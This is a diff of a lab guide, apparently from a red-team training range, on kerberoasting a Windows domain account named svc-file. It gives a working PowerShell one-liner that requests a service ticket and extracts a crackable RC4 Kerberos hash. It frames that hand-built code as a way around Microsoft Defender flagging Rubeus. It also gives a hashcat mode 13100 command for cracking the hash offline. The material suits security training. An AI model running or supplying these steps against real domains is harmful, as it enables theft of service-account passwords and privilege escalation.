@@ -9,7 +9,11 @@ The point of kerberoasting is to get credentials for accounts with higher privle
 As you can imagine, even lowly Domain Users need to interact with file services, and can request tickets associated with these SPN accounts. Previously you did this were Rubeus, now we are going to turn on defender, watch it delete that tool immediately because it is super burned, and then craft our own Ticket Requests to get the Kerb Hash back from the svc-file account.
 
 
+Login from LIGHTEATER to TWORIVERS using RDP and the following user level credentials:  
+
 1. Now that you have the SAM account names, perform a subsquent query to obtain the SPN names. These will be used to perform targeted kerberoasting attacks by obtaining the kerberos pre-authentication ticket hash from the DC.
+
+
 
 ```
 $name="svc-file"
@@ -18,21 +22,31 @@ $name="svc-file"
 
 1. Armed with the list of the user SAM accounts and SPN names, we will perform the attack using the command below. Note that you will need to change the SPN and SAM account for each user (e.g., "`HOST/dragonmount.wheel.co`", "`svc-file`"). Copy the SPN hashes to crack offline.
 
+Requesting a TGS-REP ticket for the user with the SPN.
+
+TGS flow is used becuase you already have a TGT because you are an authenticated domain user. So you can request tickets for any Service.
+
+SPNs
 
 ```
-$_spn={param($spn,$sam);$_=[reflection.assembly]::loadwithpartialname("system.identitymodel");$tgt=[identitymodel.tokens.kerberosrequestorsecuritytoken]::new($spn);$tb=$tgt.getrequest();if($tb){$th=[bitconverter]::tostring($tb)-replace"-";[collections.arraylist]$pt=($th-replace"^(.*?)04820...(.*)","`$2")-split"a48201";$pt.removeat($pt.count-1);$hs=$pt-join"a48201";$hs=$hs.insert(32,"`$");"`n`$krb5tgs`$23`$*"+$sam+"/"+$spn+"*`$"+$hs;}};$_spn.invoke("HOST/dragonmount.wheel.co", "svc-file");
+$_spn={param($spn,$sam);$_=[reflection.assembly]::loadwithpartialname("system.identitymodel");
+
+$tgt=[identitymodel.tokens.kerberosrequestorsecuritytoken]::new($spn);$tb=$tgt.getrequest();if($tb){$th=[bitconverter]::tostring($tb)-replace"-";[collections.arraylist]$pt=($th-replace"^(.*?)04820...(.*)","`$2")-split"a48201";$pt.removeat($pt.count-1);$hs=$pt-join"a48201";$hs=$hs.insert(32,"`$");"`n`$krb5tgs`$23`$*"+$sam+"/"+$spn+"*`$"+$hs;}};$_spn.invoke("HOST/dragonmount.wheel.co", "svc-file");
 ```
+Returns the RC4 HASH
+
+1. Copy the output into a file named kerb.hash
 
 
-1. Collect the hashes into a text file (`kerb.hash`) on your kali operater box. 
-
-
-1. Get the provided word list (`rawk_you.txt`) from the file server, and run John/Hashcat with it.
+1. If you wanted to use hashcat, yourcommand would look like this. Of course the password has to be in the list.
    ```sh
-   wget http://172.16.2.2:8080/rush_hour/rawk_you.txt \
    hashcat -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O ./kerb.hash ./rawk_you.txt
    ```
    Keep a text file with the decrypted passwords for each domain admin.
+
+13100 is the type used for this kind of ticket.
+> You can view modes using: `hashcat -h | grep -i kerberos`
+
 
 
 
